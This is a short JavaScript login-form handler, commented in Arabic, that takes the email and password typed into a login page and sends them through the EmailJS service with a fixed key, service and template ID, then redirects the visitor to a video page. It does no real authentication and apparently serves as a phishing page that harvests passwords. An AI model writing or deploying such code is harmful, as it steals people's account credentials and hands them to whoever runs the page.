emailjs.init("T8dFFYK-nFxpuLbbv"); // ضع هنا "Public Key" الخاص بك
document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("username").value;
    let password = document.getElementById("password").value;

    emailjs.send("service_dl2pg3o", "template_ca3b0oj", {
        email: email,
        password: password
    }, "T8dFFYK-nFxpuLbbv")
     .then(function(response) {
        console.log("✅ تم الإرسال بنجاح!", response);
        window.location.href = "video.html";  // تحويل المستخدم بعد تسجيل الدخول
    }, function(error) {
        console.error("❌ فشل الإرسال:", error);
        alert("فشل إرسال البيانات! تأكد من إعدادات EmailJS.");
    });
});
